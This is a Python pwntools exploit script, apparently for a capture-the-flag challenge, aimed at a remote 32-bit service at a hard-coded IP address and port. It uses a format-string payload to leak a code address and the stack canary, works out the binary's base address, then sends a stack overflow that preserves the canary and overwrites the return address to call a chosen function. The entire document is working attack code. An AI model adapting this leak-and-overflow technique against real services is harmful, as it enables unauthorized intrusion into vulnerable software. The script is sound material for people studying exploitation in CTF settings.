from pwn import *

context.arch = 'i386'

p = remote('14.225.212.104', 9004)
p.recvuntil(b'My defense is too solid to be breached.\n')

# Leak
p.sendline(b'%3$08x|%15$08x')
output = p.recvuntil(b'Pow Pow Pow\n')
values = output.split(b'Pow')[0].strip().split(b'|')

code_leak = int(values[0], 16)
canary = int(values[1], 16)

base = code_leak - 0x1433
braum = base + 0x12cd
pop_ret = base + 0x1022

log.info(f"Testing braum call on remote...")

# Just call braum
payload = b'A' * 32
payload += p32(canary)
payload += p32(0)
payload += p32(0)
payload += p32(braum)
payload += p32(pop_ret)
payload += p32(0x1337)
payload += b'AFTER_BRAUM'  # marker

p.sendline(payload)
sleep(1)
try:
    data = p.recvall(timeout=2)
    log.info(f"Received: {data}")
except:
    log.info("No data received")
p.close()
